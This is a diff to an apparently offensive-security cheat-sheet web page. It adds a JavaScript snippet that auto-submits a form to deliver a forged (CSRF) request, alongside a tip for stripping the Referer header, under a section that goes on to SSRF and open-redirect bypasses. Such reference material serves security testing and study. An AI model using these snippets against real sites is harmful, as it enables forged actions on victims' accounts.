@@ -608,7 +608,11 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
 &lt;/html&gt;
 	</code></pre>
     	<li> To avoid sending the referrer header:
-<pre><code>&lt;meta name="referrer" content="never"></code></pre>
+		<pre><code>&lt;meta name="referrer" content="never"></code></pre>
+	<li> To send malicious request automatic:
+ 		<pre><code>&lt;script type="text/javascript">
+	document.forms[0].submit();
+&lt;/script></code></pre>
 
 <h3 id='n2.4'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Chains </h3>
 	<li>Redirect bypasses for Open Redirect & SSRF!
